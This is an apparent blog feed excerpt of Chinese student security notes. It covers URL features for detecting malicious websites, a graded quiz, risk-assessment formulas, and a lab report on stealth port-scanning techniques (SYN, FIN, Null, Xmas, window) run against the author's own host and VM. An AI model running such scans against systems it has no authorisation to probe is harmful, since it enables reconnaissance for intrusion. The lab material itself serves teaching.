      <url>/2023/09/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>动机——introduction</li><li>方法——method</li><li>结果——experimrnt</li><li>改进——limitations</li></ul><h2 id="快速阅读"><a href="#快速阅读" class="headerlink" title="快速阅读"></a>快速阅读</h2><ul><li>掌握动机</li><li>解决了什么问题</li><li>创新性是什么</li></ul><h3 id="精细阅读"><a href="#精细阅读" class="headerlink" title="精细阅读"></a>精细阅读</h3><ul><li>复现代码，对比试验</li><li>研究同样的课题，我要改进</li><li>不同的课题，我用她的方法。</li></ul><h3 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h3><ul><li>整体性的图可看——快速</li><li>步骤图——可略</li></ul><h3 id="该跳过就跳过"><a href="#该跳过就跳过" class="headerlink" title="该跳过就跳过"></a>该跳过就跳过</h3><ul><li>研究现状——新手？</li></ul><h3 id="多思考，提问"><a href="#多思考，提问" class="headerlink" title="多思考，提问"></a>多思考，提问</h3><ul><li>他为什么这么做</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据挖掘，论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文阅读方法，快速阅读，精细化阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意网站检测</title>
      <link href="/2023/09/25/%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/"/>
      <url>/2023/09/25/%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正常与恶意网址的区别"><a href="#一、正常与恶意网址的区别" class="headerlink" title="一、正常与恶意网址的区别"></a>一、正常与恶意网址的区别</h2><ul><li><h3 id="表层特征"><a href="#表层特征" class="headerlink" title="表层特征"></a>表层特征</h3><ul><li>简短？复杂</li><li>是否各部分都存在（锚点#）</li><li>域名后缀</li><li>…</li></ul></li><li><h3 id="基于机器学习的检测方法"><a href="#基于机器学习的检测方法" class="headerlink" title="基于机器学习的检测方法"></a>基于机器学习的检测方法</h3><ul><li><h4 id="数据采集与清洗"><a href="#数据采集与清洗" class="headerlink" title="数据采集与清洗"></a>数据采集与清洗</h4><ul><li>tldextract</li><li>whois（查域名）</li></ul></li><li><h4 id="特征分析及取值研究"><a href="#特征分析及取值研究" class="headerlink" title="特征分析及取值研究"></a>特征分析及取值研究</h4><ul><li><p>是否有ip【-1，1】</p></li><li><p>url长度【-1，0，1】</p></li><li><p>短网址服务【-1，1】——使用一个重定向，short–&gt;真实</p></li><li><p>是否有@【-1，1】——忽略前面的内容，重定向到@后面有的浏览器支持</p></li><li><p>是否有&#x2F;&#x2F;——1.需要双斜杠，2.需要web服务的一个错误配置</p><ul><li>正常：</li><li><a href="http://a/b/c">http://a/b/c</a>:     :a-&gt;b-&gt;c</li><li><a href="http://a/b//c">http://a/b//c</a>     ：a-&gt;b-&gt;””-&gt;c</li></ul></li><li><p>pageRanking【-1，1】——入度越高 越重要，恶意网站频繁更换域名，pagerank得分就非常低</p></li><li><p>谷歌收录该域名的情况【-1，1】</p></li><li><p>子域名的个数【-1，0，1】——一般不会很多的</p></li><li><p>是否有ssl【-1，0，1】——是否可信，是否使用ssl</p></li><li><p>域名注册时间【-1，1】——可信的一般注册时间长</p></li><li><p>图标【-1，1】——恶意的仓促，没有的概率大</p></li><li><p>port【1，-1】</p></li><li><p>httpsToken【-1，1】——看域名前是否有“https”</p></li><li><p>request_url【-1，1】</p></li><li><p>url of anchor【-1，1】——看网页中的超链接是否连接到外部网址，而不是本域名</p></li><li><meta>link in tags  【1，-1，0】——当中的超链接是否外部域名<ul><li>鼠标悬停隐藏</li><li>右键禁止</li><li>弹窗</li><li>dnsrecord，，是否大</li><li>检测流量——alex排名</li><li>result【-1，1】</li></ul></li></ul></li></ul></li><li><h4 id="算法选择"><a href="#算法选择" class="headerlink" title="算法选择"></a>算法选择</h4><ul><li>二分类</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据挖掘技术，恶意网站检测 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网安技术习题总结</title>
      <link href="/2023/09/25/%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/25/%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="1-单选题-2分-网络信息的机密性保护"><a href="#1-单选题-2分-网络信息的机密性保护" class="headerlink" title="1. (单选题, 2分)网络信息的机密性保护"></a>1. (单选题, 2分)网络信息的机密性保护</h3><ul><li>A. 确保网络信息没有遭到篡改和破坏</li><li>B. 确保网络信息没有遭到篡改</li><li>C. 确保网络信息没有遭到破坏</li><li>D. 确保网络信息没有遭到泄露</li></ul><p><em>我的答案:</em> A:确保网络信息没有遭到篡改和破坏;<em>正确答案:</em> D:确保网络信息没有遭到泄露;</p><p><em>0</em>分</p><h3 id="2-单选题-2分-网络安全保护对象不涉及"><a href="#2-单选题-2分-网络安全保护对象不涉及" class="headerlink" title="2. (单选题, 2分)网络安全保护对象不涉及"></a>2. (单选题, 2分)网络安全保护对象不涉及</h3><ul><li>A. 电磁设备</li><li>B. 网络用户</li><li>C. 通信系统</li><li>D. 运行数据</li></ul><p><em>我的答案:</em> A:电磁设备;<em>正确答案:</em> B:网络用户;</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安技术 </tag>
            
            <tag> 习题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>风险管理</title>
      <link href="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"/>
      <url>/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>风险：威胁源、威胁行为、资产的脆弱性、资产、影响</p></blockquote><h2 id="风险管理内容"><a href="#风险管理内容" class="headerlink" title="风险管理内容"></a>风险管理内容</h2><p>定义：1.是识别、控制、消除或最小化可能影响系统资源的不确定因素的过程；2.在组织机构内部识别、优化、管理风险，使风险降低到可接受水平的过程</p><p>&#x3D;&#x3D;四个阶段，两个贯穿&#x3D;&#x3D;</p><blockquote><p>建立背景、风险评估（客观认识到风险的属性）、风险处理、批准监督</p><p>监控审查    沟通咨询</p></blockquote><h3 id="一、风险术语"><a href="#一、风险术语" class="headerlink" title="一、风险术语"></a>一、风险术语</h3><ul><li>资产：有价值的</li><li>脆弱性：与资产有关的弱点或安全隐患，是造成风险的内因（eg.代码缺陷）。脆弱性本身并不对资产构成危害，但是满足一定条件时，脆弱性会被威胁源利用恰当的威胁方式对资产造成不良后果</li><li>控制措施：防范威胁，降低风险的措施。eg.部署防火墙</li><li>可能性：威胁源利用脆弱性造成不良后果的可能性</li><li>影响：威胁源利用脆弱性造成不良后果的程度大小</li><li>风险：威胁源可能采用恰当的威胁方式利用脆弱性造成不良后果</li><li>残余风险：采取了安全措施后仍然可能存在的风险（综合考虑成本与效益</li></ul><h3 id="二、风险评估（未完成）"><a href="#二、风险评估（未完成）" class="headerlink" title="二、风险评估（未完成）**"></a>二、风险评估（未完成）**</h3><blockquote><p>风险评估vs风险管理</p></blockquote><blockquote><ol><li><table><thead><tr><th>vs</th><th>风险管理</th><th>风险评估</th></tr></thead><tbody><tr><td>目标</td><td>将风险降低到可接受水平</td><td>确定面临的风险并确定其优先级</td></tr><tr><td>周期</td><td>风险评估、风险决策、风险控制</td><td>属于风险管理中的单个阶段</td></tr><tr><td>计划</td><td>持续：PDCA循环 (Plan, Do, Check, Adjustment)</td><td>按需要</td></tr></tbody></table></li></ol></blockquote><h4 id="风险评估实践"><a href="#风险评估实践" class="headerlink" title="风险评估实践"></a>风险评估实践</h4><h5 id="1-政策要求"><a href="#1-政策要求" class="headerlink" title="1. 政策要求"></a>1. 政策要求</h5><h5 id="2-风险评估、检查评估和等级保护测评之间的关系"><a href="#2-风险评估、检查评估和等级保护测评之间的关系" class="headerlink" title="2. 风险评估、检查评估和等级保护测评之间的关系"></a>2. 风险评估、检查评估和等级保护测评之间的关系</h5><ul><li>等保测评、安全检查都是在既定安全基线的基础上开展的符合性测评</li><li>等保测评：符合国家安全要求；安全检查：符合行业主管安全要求</li><li>风险评估：在国家、行业安全要求的基础上，以被评估系统特定安全要求为目标而开展的风险识别、风险分析、风险评价活动。</li><li>核心是风险的基本要素（威胁源、威胁行为、脆弱性、资产、影响）。</li></ul><h3 id="三、风险处置方法"><a href="#三、风险处置方法" class="headerlink" title="三、风险处置方法**"></a>三、风险处置方法**</h3><ul><li>减低风险<ul><li>减少威胁源——法律手段</li><li>减低威胁能力——采用身份鉴别措施（要做身份鉴别的网站，写报告）</li><li>减少脆弱性——补丁、关闭无用的端口   <strong>大部分</strong></li><li>防护资产——采用各种防护手段，建立资产的 <strong>安全域，</strong>价值得到保护</li><li>降低负面影响——容灾备份、应急响应、业务连续计划</li></ul></li><li>转移风险<ul><li>资产转移到其它的地方</li><li>只有当风险不能被降低或避免，第三方可以接受</li><li>低概率，但一旦发生就有重大影响。</li><li>方式：服务外包、保险</li></ul></li><li>规避风险<ul><li>物理隔离设备</li><li>没有足够的安全保障的信息系统，就不用来存放特别敏感的信息</li><li>只处理内部业务的系统，<strong>内网</strong>——公安、军方</li></ul></li><li>接受风险<ul><li>发生的概率低</li><li>规避投入太大</li><li>发生造成的影响小</li></ul></li></ul><h3 id="三、批准监督——防线管理工作内容"><a href="#三、批准监督——防线管理工作内容" class="headerlink" title="三、批准监督——防线管理工作内容"></a>三、批准监督——防线管理工作内容</h3><ul><li>批准</li></ul><h2 id="系统生命周期中的风险管理"><a href="#系统生命周期中的风险管理" class="headerlink" title="系统生命周期中的风险管理"></a>系统生命周期中的风险管理</h2><h3 id="一、何时实施风险管理"><a href="#一、何时实施风险管理" class="headerlink" title="一、何时实施风险管理"></a>一、何时实施风险管理</h3><ul><li><p>​整个生命周期都要（包括废弃阶段）</p><ul><li><p><strong>规划</strong></p><ul><li>对系统安全性的实施可能性分析，指定总体安全规划</li></ul></li><li><p><strong>设计</strong></p><ul><li>根据规划方案 <strong>设计信息系统安全的实现结构和实施方案</strong></li></ul></li><li><p><strong>实施</strong></p><ul><li>落实，开发</li><li>安全测试、检查与配置、人员培训、授权系统运行</li></ul></li><li><p><strong>运维</strong></p><ul><li>运行过程中保证系认同的安全性</li></ul></li><li><p><strong>废弃</strong></p><ul><li>过时或无用的部分安全报废</li></ul><blockquote><p>有概念、系统生命周期及目的</p></blockquote></li></ul></li></ul><h3 id="二、风险评估流程"><a href="#二、风险评估流程" class="headerlink" title="二、风险评估流程"></a>二、风险评估流程</h3><ul><li><p>准备、风险要素识别、风险分析、风险结果判定</p></li><li><p><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20221226190303925-16956021746852.png" alt="img"></p><h4 id="风险评估准备"><a href="#风险评估准备" class="headerlink" title="风险评估准备"></a>风险评估准备</h4><ol><li>制定计划、方案；选择风险评估方法、工具；制定风险评估准则；获得决策层的认可批准</li></ol><h4 id="风险要素识别"><a href="#风险要素识别" class="headerlink" title="风险要素识别"></a>风险要素识别</h4><ol><li><p>资产识别与赋值（很基础）</p><ol><li><p>是整个风险评估的&#x3D;&#x3D;起点和终点&#x3D;&#x3D;</p></li><li><p>重难点——业务战略–&gt;信息化战略–&gt;系统特征</p></li><li><p>资产评估</p><ul><li><p>对资产机制或重要程度进行评估</p></li><li><p>定性——5级 非常重要….</p></li><li><p>定量——5、4….</p></li><li><p>从资产本身的属性——机密、完整、可用、可审计、不可抵赖——&gt;综合评估得出</p></li><li><blockquote><p>就是先分再总</p></blockquote></li><li><p>综合评估</p><ul><li>最大原则——选里面最大的</li><li>加权原则——给每个属性赋权</li></ul></li><li><p>资产本身属性有一个&#x3D;&#x3D;赋值表&#x3D;&#x3D;，选择题能够判断。</p></li></ul></li></ol></li><li><p>威胁</p><ul><li>识别：从威胁源的角度；威胁树、系统故障威胁树</li><li>评估：针对频率和强度评估<ul><li>也有一个&#x3D;&#x3D;赋值表&#x3D;&#x3D;</li></ul></li><li>对非常重要的资产才进行威胁识别。</li><li>方法：日志分析…</li><li>分类：<ul><li>人为故意威胁</li><li>认为非故意威胁</li><li>自然威胁</li></ul></li></ul></li><li><p><em>脆弱性</em>&#x3D;&#x3D;&#x3D;漏洞</p><ol><li><p>脆弱性识别与威胁识别的关系：</p><ul><li>以资产为对象，对威胁识别进行验证</li></ul></li><li><p>难点</p><ul><li>三性：隐蔽性、欺骗性、复杂性</li></ul></li><li><p>分类</p><ul><li>管理、结构、操作、技术、物理（有指导表）</li></ul></li><li><p>脆弱性识别的工作方式（选择题）</p><ul><li>安全配置核查</li><li>漏洞扫描</li><li>渗透测试——护网行动</li><li>安全架构分析</li><li>数据流分析</li><li>访谈</li></ul></li><li><p>也有一个标准表</p></li></ol></li><li><p>确认已有的安全措施（很重要）</p><ol><li>预防、检测、纠正、威慑</li></ol></li></ol></li></ul><h4 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h4><ul><li><p>计算风险值&#x3D;R(A,T,V)&#x3D;R( L(T,V), F(IA, VA)   （能写 且能解释）</p><p><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20221226194547825.png" alt="image-20221226194547825"></p></li><li><p>a-asset，t-thread</p></li><li><p>定性风险分析——矩阵法</p></li><li><p>风险评估工具</p></li></ul><h6 id="风险分析方法"><a href="#风险分析方法" class="headerlink" title="风险分析方法"></a>风险分析方法</h6><ol><li><p>类别</p><ul><li><p>定性</p></li><li><p>定量</p></li><li><p>综合</p></li></ul></li><li><p>定性风险分析方法</p><ul><li>凭借分析者的经验和直觉，业界的标准和惯例、粗粒度（可能 非常可能…）</li><li>更具有主观性</li><li>发生概率、后果与影响</li><li>矩阵分析<ul><li><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20231008083446845.png" alt="image-20231008083446845"></li></ul></li></ul></li><li><p>定量风险分析</p><ul><li>风险评估与成本效益分析期间手机的各个组成部分计算客观数字值</li><li>更具客观性</li><li>公式</li><li>期望年度损失ALE<ul><li>评估资产：根据资产价值（AV）清单,计算资产总价值及 资产损失对财务的直接和间接影响</li><li>确定单一预期损失：SLE<ul><li>SLE是指发生一次风险引起的收入损失总额</li><li>将资产价值与暴露系数相乘 (EF) 计算出 SLE。暴露系数表示为 现实威胁对某个资产造成的损失百分比</li></ul></li><li>确定年发生率ARO<ul><li>ARO指一年中风险发生的次数</li></ul></li><li>确定年预期损失ALE：&#x3D;&#x3D;ALE&#x3D;SLE<em>ARO&#x3D;AV</em>EF*ARO&#x3D;&#x3D;</li><li>确定控制成本：规避企业存在的风险发生而投入的费用（安全人员招聘）</li><li>安全投资收益：ROSI<ul><li>ROSI &#x3D; (实施控制前的ALE）–（实施控制后的ALE）–（年控制成本）</li></ul></li></ul></li></ul></li><li><p>定性VS定量</p><ol><li>定性更容易达成一致，定量则不</li><li>定性在重要风险之间没有足够的区分力度；定量则不。</li><li>定性没有为成本效益分析</li></ol></li><li><p>半定量分析</p><ul><li>综合二者</li><li>相乘法<img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20231008085358931.png" alt="image-20231008085358931"></li></ul></li><li><p>综合评估（几乎）</p><ul><li>层次分析AHP</li><li>模糊综合评价</li><li>基于灰色理论</li><li>…</li></ul></li></ol><h6 id="国产化替代"><a href="#国产化替代" class="headerlink" title="国产化替代"></a>国产化替代</h6><ol><li>阶段<ul><li>外围——&gt;工业软件替代——&gt;信息系统整体国产化</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 风险评估、风险处置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描</title>
      <link href="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>实验2：端口扫描实验</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><p><strong>内容：</strong></p><p>本次实验主要对主机扫描和端口扫描原理的理解。使用Python（Scapy库）编写端口扫描程序，对目标IP（包含IP地址段）进行扫描。</p><p><strong>（1）</strong> <strong>使用ICMP协议探测主机是否开启；</strong></p><p> 将ip设置为本机环回地址，ping该主机，并在终端运行该代码，显示如下，说明本机开启。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170751823.png" alt="image-20230922170751823"></p><p>​图 1 访问本机环回地址成功</p><p>代码解释：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170829376.png" alt="image-20230922170829376"></p><p>1.由于ICMP协议是基于IP协议传输的，所以需要通过scrapy中的IP()先构造IP包。这里删除了原有&#x2F;b的内容，&#x2F;b后跟的是包传输的数据，但是经过实验发现，跟上数据比较容易造成丢包，所以删除了附带的data。</p><p>2.sr1()是scrapy中能够返回接收报文的一个函数，它能够发送三层数据包，并等待接收一个数据包的响应，其中timeout等待响应的最大时间（以秒为单位）。这里设置为1秒，表示如果在1秒内没有收到响应，函数将超时并返回None；verbose是一个布尔值，用于控制是否显示Scapy的详细输出，将其设置为False以禁用详细输出以打印自己想要的输出。</p><p>除此以外，sr1()还可以通过display函数显示详细信息，如下图所示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170905796.png" alt="image-20230922170905796"></p><p>​图 2 ping.display()</p><p><strong>（2）</strong> <strong>对本机（关闭防火墙）的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与Nmap扫描结果进行比较。</strong></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170948521.png" alt="image-20230922170948521"></p><p>​图 3关闭所有防火墙</p><ol><li>半连接：</li></ol><p>•     原理：扫描者向目标主机发送一个SYN数据包，如果目标主机以SYN&#x2F;ACK响应，这表明主机仍然活跃；但如果目标主机以RST&#x2F;ACK响应，这表示主机不再活跃；如果未响应，则被过滤。</p><p>•     代码展示：（开放端口：23；非开放端口：1500）</p><p>Ipconfig查看主机ip：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171014628.png" alt="image-20230922171014628"></p><p>​图 4主机ip</p><p>函数实现：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171036890.png" alt="image-20230922171036890"></p><p>​图 5 SYN</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171058185.png" alt="image-20230922171058185"></p><p>​图 6 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171103564.png" alt="image-20230922171103564"></p><p>​图 7 右scrapy，左nmap，非开放端口</p><ol start="2"><li>ACK：</li></ol><p>•     原理：虽然根据课上所学，ACK扫描应该能够根据ttl的大小来判断端口是否开放，但是在本机使用了nmap并结合实验以及网上查阅资料，得出一个结论，针对本机的windows操作系统，ack扫描只能够确定端口是过滤状态或是未过滤状态，不能够判断端口是否开放。</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171140912.png" alt="image-20230922171140912"></p><p>​图 8 ACK</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171155840.png" alt="image-20230922171155840"></p><p>​图 9 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171201340.png" alt="image-20230922171201340"></p><p>​图 10 右scrapy，左nmap，非开放端口</p><ol start="3"><li>FIN：</li></ol><p>•     原理：它利用TCP协议中的FIN（Finish）标志位来发送TCP数据包，以了解目标主机的响应，这是在TCP通信中四次挥手过程中产生效应的标志位，根据目标主机接响应的FIN数据包的情况来判断其端口的状态。如果端口开放或者被过滤，则没有反应；端口关闭，目标主机会发送RST。<em>经过实验发现，fin扫描在本操作系统失效，详情见结果展示。以下采用wireshark抓包证实，后面若遇到失效都会在nmap执行命令时抓包来证实结论。</em></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171229157.png" alt="image-20230922171229157"></p><p>​图 11wireshark抓包证实FIN失效</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171243358.png" alt="image-20230922171243358"></p><p>​图 12 FIN</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171257672.png" alt="image-20230922171257672"></p><p>​图 13 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171303520.png" alt="image-20230922171303520"></p><p>​图 14 右scrapy，左nmap，非开放端口</p><ol start="4"><li>Null：</li></ol><p>•     原理：与FIN类似，只是flag置空，且在本操作系统也失效</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171328134.png" alt="image-20230922171328134"></p><p>​图 15 NULL失效</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171334905.png" alt="image-20230922171334905"></p><p>​图 16 NULL</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171405262.png" alt="image-20230922171405262"></p><p>​图 17 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171410772.png" alt="image-20230922171410772"></p><p>​图 18 右scrapy，左nmap，非开放端口</p><ol start="5"><li>Xmas：</li></ol><p>•     原理：与FIN类似，只是flag置FIN\URG\PUSH三个标志位。本操作系统失效。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171431343.png" alt="image-20230922171431343"></p><p>​图 19 XMAS失效</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171445897.png" alt="image-20230922171445897"></p><p>​图 20 XMAS</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171458282.png" alt="image-20230922171458282"></p><p>​图 21 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171504061.png" alt="image-20230922171504061"></p><p>​图 22 右scrapy，左nmap，非开放端口</p><ol start="6"><li>Windows：</li></ol><p>•     原理：窗口扫描也是发送一个ACK报文，但它能够通过“window”字区别出端口的开放状态，理论上说，window&gt;0，端口开放；window&#x3D;0,端口关闭；未响应，则被过滤，无法判断端口开放情况。通过wireshark抓包显示，本操作系统上的的包回应不满足此规则，实验发现所有包回复的window都为0，又失效。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171528441.png" alt="image-20230922171528441"></p><p>​图 23 window失效</p><p>•     代码展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171541208.png" alt="image-20230922171541208"></p><p>​图 24 Window</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171551787.png" alt="image-20230922171551787"></p><p>​图 25 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171556565.png" alt="image-20230922171556565"></p><p>​图 26 右scrapy，左nmap，非开放端口</p><p><strong>（3）</strong> <strong>对远程（有防火墙）主机的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与2）进行比较，分析结果。</strong></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171613749.png" alt="image-20230922171613749"></p><p>​图 27　虚拟机操作系统信息</p><p>开启防火墙</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171633854.png" alt="image-20230922171633854"></p><p>​图 28　开启防火墙</p><ol><li>首先测试虚拟机是否能够ping通</li></ol><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171658660.png" alt="image-20230922171658660"></p><p>​图 29 linux虚拟机作为远程主机，能够ping通</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171708690.png" alt="image-20230922171708690"></p><p>​图 30　查看虚拟机的开放端口</p><p>开放端口使用：23；非开放端口：1500</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171722920.png" alt="image-20230922171722920"></p><p>​图 31　修改IP与端口列表</p><ol start="2"><li>半连接</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171803490.png" alt="image-20230922171803490"></p><p>​图 32　SYN测试虚拟机</p><ol start="3"><li>ACK</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171833131.png" alt="image-20230922171833131"></p><p>​图 33　ＡＣＫ测试虚拟机</p><ol start="4"><li>FIN</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171854512.png" alt="image-20230922171854512"></p><p>​图 34　FIN测试虚拟机</p><ol start="5"><li>NULL</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172001270.png" alt="image-20230922172001270"></p><p>​图 35　NULL测试虚拟机</p><p>6.XMAS</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172018268.png" alt="image-20230922172018268"></p><p>​图 36　XMAS测试虚拟机</p><p>7.Window</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172035070.png" alt="image-20230922172035070"></p><p>​图 37　Window测试虚拟机</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172045295.png" alt="image-20230922172045295"></p><p>​图 38　wires hark抓包显示</p><p>8.结果解释</p><p>通过与第二个任务中本机Windows系统端口扫描结果比对，能够发现Linux除了Window扫描外，使用其他的隐秘扫描方式的结果均与理论相符，可以推测Linux是符合RFC规则的，而本机操作系统Win10专业版则有自己的规则。</p><p>针对window扫描在两个操作系统均失效的情况，我只能通过抓包来展示回复包的信息。发现测试的两个操作系统在使用Window扫描时，无论端口是否开放，目标主机均会回复一个flag为R的包，且Win均为0，不会被过滤。</p><p><strong>（1）</strong> <strong>回答问题：样例程序中“conf.L3socket&#x3D;L3RawSocket”的作用是什么？</strong></p><ol><li>前提解释</li></ol><p>Scrapy是一种高级的网络框架，它本身是将一些底层的网络数据包操作封装起来了，一般使用时，不需要直接通过套接字编程。</p><ol start="2"><li>代码作用</li></ol><p>​     i.    属于——配置超级套接字（Scrapy官方文档解释）</p><p>​    ii.    表示通过 libpcap 接收&#x2F;发送 L3 数据包</p><p>   iii.    深入理解：这样的配置，可以手动指定原始套接字，当需要构造一些特定类型的网络数据包来进行探测活动时，这样的用法就很有必要。</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口扫描 半连接 scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html深入</title>
      <link href="/2023/09/20/html%E6%B7%B1%E5%85%A5/"/>
      <url>/2023/09/20/html%E6%B7%B1%E5%85%A5/</url>
      
